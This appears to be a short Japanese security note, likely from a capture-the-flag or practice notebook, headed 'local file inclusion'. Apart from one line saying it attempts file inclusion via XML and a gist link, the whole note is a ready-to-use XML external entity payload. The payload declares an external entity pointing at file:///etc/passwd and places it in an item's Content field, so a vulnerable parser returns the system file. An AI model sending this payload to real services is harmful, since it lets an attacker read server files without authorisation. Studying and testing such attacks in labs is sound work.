## local file inclusion

xml で良い感じに local file inclusion を試みます

https://gist.github.com/N1gh7m4r3-N1dh/a25dd8a9f6b7648561dfed50bb3b0620

```
<?xml version="1.0"?>
<!DOCTYPE lfi [
  <!ELEMENT lfi ANY>
  <!ENTITY boo SYSTEM
  "file:///etc/passwd">
]>
<item>
        <Author>sanposhiho</Author>
        <Subject>testes</Subject>
        <Content>&boo;</Content>
</item>

```
